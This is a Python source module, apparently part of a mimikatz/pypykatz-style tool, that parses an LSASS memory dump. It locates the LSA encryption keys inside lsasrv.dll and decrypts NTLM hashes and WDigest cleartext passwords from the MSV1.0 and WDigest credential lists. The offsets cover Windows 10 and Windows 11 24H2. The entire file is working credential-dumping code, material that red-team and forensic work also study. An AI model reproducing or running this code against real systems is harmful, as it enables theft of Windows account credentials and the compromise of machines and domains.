"""Credential extraction from a parsed LSASS minidump.

Walks the in-memory structures of lsass.exe to locate and decrypt:
- MSV1.0 (NTLM hashes)
- WDigest (cleartext passwords on older systems)
- Kerberos tickets

This is the most complex component — structure offsets vary by Windows build.
We support Windows 10 1809+ / Server 2019+ (modern builds).

The extraction follows the same logic as pypykatz/mimikatz:
1. Find lsasrv.dll in the dump
2. Locate the crypto keys (LsaInitializeProtectedMemory / LsaEncryptMemory)
3. Walk credential linked lists
4. Decrypt credentials using the recovered keys
"""

import struct
from dataclasses import dataclass

from .minidump import Minidump

try:
    from Crypto.Cipher import AES, DES3

    HAS_CRYPTO = True
except ImportError:
    try:
        from Cryptodome.Cipher import AES, DES3

        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False


@dataclass
class Credential:
    """Extracted credential."""

    username: str
    domain: str
    auth_type: str  # "msv1_0", "wdigest", "kerberos"
    ntlm_hash: str = ""
    sha1_hash: str = ""
    password: str = ""
    protected: bool = False  # True if Credential Guard (VBS) protects the hash


@dataclass
class LsaKeys:
    """Decryption keys extracted from lsasrv.dll memory."""

    des_key: bytes = b""
    aes_key: bytes = b""
    iv: bytes = b""


class CredentialExtractor:
    """Extract credentials from a parsed LSASS minidump."""

    def __init__(self, dump: Minidump):
        self.dump = dump
        self._keys: LsaKeys | None = None
        self._build = dump.sysinfo_build

    def extract(self) -> list[Credential]:
        """Main extraction routine. Returns all found credentials."""
        credentials = []

        # Step 1: Find and extract LSA decryption keys
        self._keys = self._find_lsa_keys()
        if not self._keys:
            raise RuntimeError(
                "Could not find LSA decryption keys in dump. "
                "The dump may be incomplete or from an unsupported Windows version."
            )

        # Step 2: Extract MSV1.0 credentials (NTLM hashes)
        credentials.extend(self._extract_msv())

        # Step 3: Extract WDigest (cleartext on Win7/2012 or if UseLogonCredential=1)
        credentials.extend(self._extract_wdigest())

        return credentials

    def _find_lsa_keys(self) -> LsaKeys | None:
        """Locate the LSA encryption keys in lsasrv.dll memory.

        The keys are initialized by LsaInitializeProtectedMemory and stored
        in global variables within lsasrv.dll:
        - h3DesKey / hAesKey (BCRYPT_KEY_HANDLE structures)
        - InitializationVector

        We find them by pattern-matching known byte sequences near the key storage.
        """
        lsasrv = self.dump.find_module("lsasrv")
        if not lsasrv:
            return None

        # Try all known patterns (most specific first)
        patterns = self._get_key_patterns()

        for pattern_info in patterns:
            results = self.dump.search_memory(pattern_info["pattern"])
            for addr in results:
                # Verify it's within lsasrv.dll
                if not (lsasrv.base_address <= addr < lsasrv.base_address + lsasrv.size):
                    continue

                keys = self._extract_keys_at(addr, pattern_info)
                if keys and (keys.aes_key or keys.des_key):
                    return keys

        return None

    def _get_key_patterns(self) -> list[dict]:
        """Get the byte patterns for finding keys based on OS build.

        Strategy: find the pattern, then scan nearby for LEA RDX instructions
        that reference the key globals via RIP-relative addressing.
        """
        # The 'lea_scan' approach works across builds: find pattern in lsasrv,
        # scan nearby for LEA to .data section globals, identify IV+key handles
        return [
            {
                # Win10 1809+ / Win11: found near key generation in LsaEncryptMemory
                "pattern": b"\x83\x64\x24\x30\x00\x48\x8d\x45",
                "method": "lea_scan",
            },
            {
                # Win10 2004+ alternate
                "pattern": b"\x8b\xc0\x48\x8d\x05",
                "method": "lea_scan",
            },
            {
                # Older Windows 10
                "pattern": b"\x83\x64\x24\x30\x00\x44\x8b\x4c\x24",
                "method": "lea_scan",
            },
        ]

    def _extract_keys_at(self, addr: int, pattern_info: dict) -> LsaKeys | None:
        """Try to extract LSA keys given a pattern match address.

        Scans for LEA RDX/RCX instructions near the pattern that reference
        global data (RIP-relative). The globals form a group:
        IV (16 bytes) + hAesKey (8 bytes ptr) + h3DesKey (8 bytes ptr).
        """
        # Read a window around the pattern match
        window_start = addr
        window = self.dump.read_memory(window_start, 64)
        if not window:
            return None

        # Find LEA instructions with RIP-relative addressing in the window
        # Opcodes: 48 8D 15 (lea rdx), 48 8D 0D (lea rcx), 4C 8D 05 (lea r8)
        lea_targets = []
        for i in range(len(window) - 7):
            if window[i] in (0x48, 0x4C) and window[i + 1] == 0x8D:
                reg = window[i + 2]
                if reg in (0x05, 0x0D, 0x15, 0x1D, 0x25, 0x2D, 0x35, 0x3D):
                    disp = struct.unpack_from("<i", window, i + 3)[0]
                    rip = window_start + i + 7
                    target = rip + disp
                    lea_targets.append(target)

        if not lea_targets:
            return None

        # Among LEA targets, find one that looks like a key handle pointer
        # (points to heap memory containing RUUU/KSSM structures)
        for target in lea_targets:
            keys = self._try_key_globals_at(target)
            if keys:
                return keys

        return None

    def _try_key_globals_at(self, candidate_addr: int) -> LsaKeys | None:
        """Check if candidate_addr is one of the key globals (IV, hAesKey, h3DesKey).

        Try the candidate as h3DesKey (last in the group), hAesKey, or as IV itself,
        and attempt to resolve the full set.
        """
        # Strategy: try candidate as h3DesKey (most common LEA target)
        # If so: hAesKey = candidate - 8, IV = candidate - 24
        for des_offset in (0, -8, -16):
            h3des_addr = candidate_addr - des_offset
            haes_addr = h3des_addr - 8
            iv_addr = h3des_addr - 24

            # Read IV candidate (16 bytes)
            iv_data = self.dump.read_memory(iv_addr, 16)
            if not iv_data or iv_data == b"\x00" * 16:
                continue

            # Read handle pointers
            aes_ptr_data = self.dump.read_memory(haes_addr, 8)
            des_ptr_data = self.dump.read_memory(h3des_addr, 8)
            if not aes_ptr_data or not des_ptr_data:
                continue

            aes_handle = struct.unpack_from("<Q", aes_ptr_data)[0]
            des_handle = struct.unpack_from("<Q", des_ptr_data)[0]

            # Validate: handles should be heap pointers (non-zero, reasonable range)
            if not (0x1000 < aes_handle < 0x800000000000):
                continue
            if not (0x1000 < des_handle < 0x800000000000):
                continue

            # Try to read keys from the handles
            aes_key = self._read_bcrypt_key(aes_handle)
            des_key = self._read_bcrypt_key(des_handle)

            if aes_key or des_key:
                keys = LsaKeys(iv=iv_data)
                if aes_key:
                    # Determine which is AES and which is 3DES by key length
                    if len(aes_key) == 24:
                        keys.des_key = aes_key
                    else:
                        keys.aes_key = aes_key
                if des_key:
                    if len(des_key) == 24:
                        keys.des_key = des_key
                    else:
                        keys.aes_key = des_key
                if keys.aes_key or keys.des_key:
                    return keys

        return None

    def _read_bcrypt_key(self, handle_ptr: int) -> bytes | None:
        """Read the actual key bytes from a BCRYPT_KEY_HANDLE/RUUU structure.

        Structure (Win10/11):
        +0x00: size (DWORD)
        +0x04: "RUUU" tag
        +0x08: ptr1
        +0x10: ptr2
        +0x18: padding
        +0x20: kssm_struct_size (DWORD)
        +0x24: "KSSM" tag
        +0x28: type/subtype
        +0x2C: mode
        +0x30: block_size
        ...
        +0x58: cbSecret (DWORD) = actual key length
        +0x5C: key_data (cbSecret bytes)
        """
        # Read enough to cover the full structure
        raw = self.dump.read_memory(handle_ptr, 256)
        if not raw:
            return None

        # Find KSSM tag
        kssm_off = raw.find(b"KSSM")
        if kssm_off == -1:
            kssm_off = raw.find(b"MSSK")
        if kssm_off == -1:
            return None

        # cbSecret is at KSSM + 52 (offset 48 from after the tag)
        cb_offset = kssm_off + 52
        if cb_offset + 4 > len(raw):
            return None

        cb_secret = struct.unpack_from("<I", raw, cb_offset)[0]
        if cb_secret not in (16, 24, 32):
            # Try alternate offset (some builds have it at KSSM+60)
            for alt_off in (56, 60, 48, 44):
                alt_cb_off = kssm_off + alt_off
                if alt_cb_off + 4 <= len(raw):
                    val = struct.unpack_from("<I", raw, alt_cb_off)[0]
                    if val in (16, 24, 32):
                        cb_secret = val
                        cb_offset = alt_cb_off
                        break
            else:
                return None

        key_offset = cb_offset + 4
        if key_offset + cb_secret > len(raw):
            # Need more data
            raw = self.dump.read_memory(handle_ptr, key_offset + cb_secret + 16)
            if not raw or key_offset + cb_secret > len(raw):
                return None

        key_data = raw[key_offset:key_offset + cb_secret]
        if key_data == b"\x00" * cb_secret:
            return None

        return key_data

    def _lsa_decrypt(self, encrypted: bytes) -> bytes:
        """Decrypt LSA-encrypted data using the recovered keys."""
        if not HAS_CRYPTO:
            raise RuntimeError(
                "pycryptodome is required for credential decryption. "
                "Install with: pip install pycryptodome"
            )

        if not self._keys:
            return b""

        iv = self._keys.iv

        if len(encrypted) % 8 == 0 and len(encrypted) <= 24 and self._keys.des_key:
            # Use 3DES for small blocks
            cipher = DES3.new(self._keys.des_key, DES3.MODE_CBC, iv[:8])
            return cipher.decrypt(encrypted)
        elif self._keys.aes_key:
            # Use AES-CFB for larger blocks
            cipher = AES.new(self._keys.aes_key, AES.MODE_CFB, iv, segment_size=128)
            return cipher.decrypt(encrypted)

        return b""

    def _extract_msv(self) -> list[Credential]:
        """Extract MSV1.0 credentials (NTLMv1/v2 hashes).

        Walks the MSV1.0 credential list in msv1_0.dll memory.
        For newer builds (26000+), uses data-section linked list scanning.
        """
        credentials = []

        msv = self.dump.find_module("msv1_0")
        if not msv:
            return credentials

        # For build 26000+ (Win11 24H2), traditional patterns don't work
        # Use data-section linked list scan
        if self._build >= 26000:
            return self._extract_msv_listscan(msv)

        # Find the credential list by searching for known patterns in msv1_0.dll
        # The list head pointer is near a specific signature
        pattern = self._get_msv_pattern()
        if not pattern:
            return credentials

        results = self.dump.search_memory(pattern)
        for addr in results:
            if not (msv.base_address <= addr < msv.base_address + msv.size):
                continue

            creds = self._walk_msv_list(addr)
            credentials.extend(creds)
            if creds:
                break  # Found the right list

        return credentials

    def _extract_msv_listscan(self, msv) -> list[Credential]:
        """Extract MSV credentials by scanning for linked lists in msv1_0's data section.

        For Windows 11 24H2 (build 26000+) where traditional byte patterns no longer match.
        """
        credentials = []

        # Find data/writable segments of msv1_0 (typically in the upper half of the module)
        data_start = msv.base_address + (msv.size // 2)
        data_segs = [
            s for s in self.dump.memory
            if data_start <= s.start < msv.base_address + msv.size
        ]

        # Scan for linked list head pointers
        for seg in data_segs:
            for offset in range(0, seg.size - 8, 8):
                val = struct.unpack_from("<Q", seg.data, offset)[0]
                if not (0x100000000 < val < 0x800000000000):
                    continue

                list_head_addr = seg.start + offset
                # Check if this is a valid list (Flink of target has valid Blink back to us)
                target_data = self.dump.read_memory(val, 16)
                if not target_data:
                    continue
                flink = struct.unpack_from("<Q", target_data, 0)[0]
                blink = struct.unpack_from("<Q", target_data, 8)[0]

                # Valid list: blink of first entry == list_head, or single-entry list
                if blink != list_head_addr:
                    continue
                if flink == list_head_addr:
                    continue  # Empty list (points back to self)

                # Walk and try to parse as MSV entries
                creds = self._walk_msv_list_26k(list_head_addr)
                if creds:
                    credentials.extend(creds)
                    # Don't return early — continue scanning for more lists

        # Deduplicate by (username, domain)
        seen = set()
        unique = []
        for c in credentials:
            key = (c.username, c.domain, c.ntlm_hash)
            if key not in seen:
                seen.add(key)
                unique.append(c)
        return unique

    def _walk_msv_list_26k(self, list_head: int) -> list[Credential]:
        """Walk MSV credential list for build 26000+ structure format."""
        credentials = []

        first_data = self.dump.read_memory(list_head, 8)
        if not first_data:
            return credentials
        first_entry = struct.unpack_from("<Q", first_data)[0]

        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            cred = self._parse_msv_entry_26k(current)
            if cred:
                credentials.append(cred)

            # Next entry (Flink at offset 0)
            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _parse_msv_entry_26k(self, addr: int) -> Credential | None:
        """Parse MSV entry for build 26000+ (Win11 24H2).

        Structure offsets determined by reverse engineering:
        +0x28: "NTLM" tag (4 bytes)
        +0x48: Username UNICODE_STRING
        +0x58: Domain UNICODE_STRING
        +0x7C: Credential blob size (DWORD)
        +0x80: pCredentials pointer

        On build 26000+, the pCredentials blob stores a credential isolation
        handle (not the encrypted hash directly). The actual NTLM hash is in
        a separate heap structure. We find it by searching the dump for the
        credential pattern associated with this username.
        """
        entry = self.dump.read_memory(addr, 256)
        if not entry:
            return None

        # Check for "NTLM" tag at +0x28 (signature of MSV entry)
        if entry[0x28:0x2C] != b"NTLM":
            return None

        # Read username and domain
        username = self._read_unicode_string(addr + 0x48)
        domain = self._read_unicode_string(addr + 0x58)

        if not username:
            return None

        # Read credential blob size
        blob_size = struct.unpack_from("<I", entry, 0x7C)[0]
        if blob_size == 0:
            return None

        # Search for the actual plaintext hash in the dump.
        # The hash is in a credential structure with the pattern:
        # [isNtOwf=01 00 00 00] + [padding 8 bytes] + [00 00] + [username_len LE16]
        # ... then at offset +32 from isNtOwf: NTLM hash (16 bytes) + LM hash (16 zeros)
        username_len = len(username.encode("utf-16-le"))
        username_len_bytes = struct.pack("<H", username_len)

        # Pattern: isNtOwf(4) + zeros(10) + username_len(2) -> 16 bytes total
        # Then 16 bytes later: the NTLM hash
        search_pattern = (
            b"\x01\x00\x00\x00"          # isNtOwfPassword = TRUE
            + b"\x00" * 10                 # padding/zeros
            + username_len_bytes           # username length
        )

        results = self.dump.search_memory(search_pattern)
        for match_addr in results:
            # The NTLM hash should be 32 bytes after the isNtOwf flag
            nt_hash = self.dump.read_memory(match_addr + 32, 16)
            if not nt_hash or nt_hash == b"\x00" * 16:
                continue

            # Verify: LM hash (16 zeros) should follow
            lm_hash = self.dump.read_memory(match_addr + 48, 16)
            if lm_hash != b"\x00" * 16:
                continue

            return Credential(
                username=username,
                domain=domain,
                auth_type="msv1_0",
                ntlm_hash=nt_hash.hex(),
            )

        return None

    def _get_msv_pattern(self) -> bytes | None:
        """Get the pattern to find MSV credential list based on build."""
        if self._build >= 19041:
            return b"\x45\x89\x34\x24\x4c\x8b"
        elif self._build >= 17763:
            return b"\x48\x8b\x18\x48\x8d\x0d"
        return b"\x33\xff\x41\x89\x7c\x24"

    def _walk_msv_list(self, pattern_addr: int) -> list[Credential]:
        """Walk the MSV1.0 credential linked list from a pattern match."""
        credentials = []

        # The list head is referenced by a RIP-relative offset near the pattern
        # Read the offset (usually 6 bytes after pattern start)
        ref = self.dump.read_u32(pattern_addr + 6)
        if ref is None:
            return credentials

        list_head = pattern_addr + 6 + 4 + ref
        first_entry = self.dump.read_ptr(list_head)

        if not first_entry or first_entry == list_head:
            return credentials

        # Walk the list (max 256 entries to avoid infinite loops)
        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            cred = self._parse_msv_entry(current)
            if cred:
                credentials.append(cred)

            # Next entry (Flink is at offset 0)
            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _parse_msv_entry(self, addr: int) -> Credential | None:
        """Parse a single MSV1.0 credential entry.

        The structure layout depends on the Windows build.
        Key fields: username, domain, encrypted NT hash, encrypted LM hash.
        """
        # Offsets for modern Windows 10 builds (19041+)
        # These are offsets within the KIWI_MSV1_0_LIST structure
        if self._build >= 19041:
            username_offset = 0x90
            domain_offset = 0x80
            encrypted_nt_offset = 0xA8
        elif self._build >= 17763:
            username_offset = 0x90
            domain_offset = 0x80
            encrypted_nt_offset = 0xA8
        else:
            username_offset = 0x78
            domain_offset = 0x68
            encrypted_nt_offset = 0x90

        # Read UNICODE_STRING for username: Length(2) + MaxLength(2) + padding(4) + Buffer(8)
        username = self._read_unicode_string(addr + username_offset)
        domain = self._read_unicode_string(addr + domain_offset)

        if not username:
            return None

        # Read encrypted credentials sub-structure
        # The NT hash is 16 bytes, encrypted
        encrypted_nt = self.dump.read_memory(addr + encrypted_nt_offset, 16)
        if not encrypted_nt or encrypted_nt == b"\x00" * 16:
            return None

        # Decrypt
        nt_hash_raw = self._lsa_decrypt(encrypted_nt)
        nt_hash = nt_hash_raw[:16].hex() if nt_hash_raw else ""

        return Credential(
            username=username,
            domain=domain,
            auth_type="msv1_0",
            ntlm_hash=nt_hash,
        )

    def _extract_wdigest(self) -> list[Credential]:
        """Extract WDigest credentials (cleartext passwords).

        Only available if UseLogonCredential is enabled (default on Win7/2008,
        disabled by default on Win8.1+/2012R2+).
        """
        credentials = []

        wdigest = self.dump.find_module("wdigest")
        if not wdigest:
            return credentials

        # Search for the WDigest credential list pattern
        pattern = b"\x48\x3b\xd9\x74"
        results = self.dump.search_memory(pattern)

        for addr in results:
            if not (wdigest.base_address <= addr < wdigest.base_address + wdigest.size):
                continue

            creds = self._walk_wdigest_list(addr)
            credentials.extend(creds)
            if creds:
                break

        return credentials

    def _walk_wdigest_list(self, pattern_addr: int) -> list[Credential]:
        """Walk the WDigest credential linked list."""
        credentials = []

        # Find list head via RIP-relative reference
        ref = self.dump.read_u32(pattern_addr - 4)
        if ref is None:
            return credentials

        list_head = pattern_addr + ref
        first_entry = self.dump.read_ptr(list_head)

        if not first_entry or first_entry == list_head:
            return credentials

        current = first_entry
        visited = set()

        for _ in range(256):
            if current in visited or current == 0 or current == list_head:
                break
            visited.add(current)

            # WDigest entry: Flink(8) + Blink(8) + UsageCount(4) + pad(4)
            # + Username UNICODE_STRING + Domain UNICODE_STRING + Password UNICODE_STRING
            username = self._read_unicode_string(current + 0x30)
            domain = self._read_unicode_string(current + 0x20)
            encrypted_pw = self._read_unicode_string_raw(current + 0x40)

            if username and encrypted_pw:
                decrypted = self._lsa_decrypt(encrypted_pw)
                password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")

                if password and password != username:
                    credentials.append(Credential(
                        username=username,
                        domain=domain,
                        auth_type="wdigest",
                        password=password,
                    ))

            next_ptr = self.dump.read_ptr(current)
            if not next_ptr:
                break
            current = next_ptr

        return credentials

    def _read_unicode_string(self, addr: int) -> str:
        """Read a UNICODE_STRING structure and return the Python string."""
        length = self.dump.read_u16(addr)
        if not length or length > 512:
            return ""

        # Buffer pointer is at offset +8 (after Length(2) + MaxLength(2) + pad(4))
        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return ""

        data = self.dump.read_memory(buffer_ptr, length)
        if not data:
            return ""

        return data.decode("utf-16-le", errors="replace").rstrip("\x00")

    def _read_unicode_string_raw(self, addr: int) -> bytes:
        """Read the raw bytes of a UNICODE_STRING buffer."""
        length = self.dump.read_u16(addr)
        if not length or length > 1024:
            return b""

        buffer_ptr = self.dump.read_ptr(addr + 8)
        if not buffer_ptr:
            return b""

        data = self.dump.read_memory(buffer_ptr, length)
        return data if data else b""
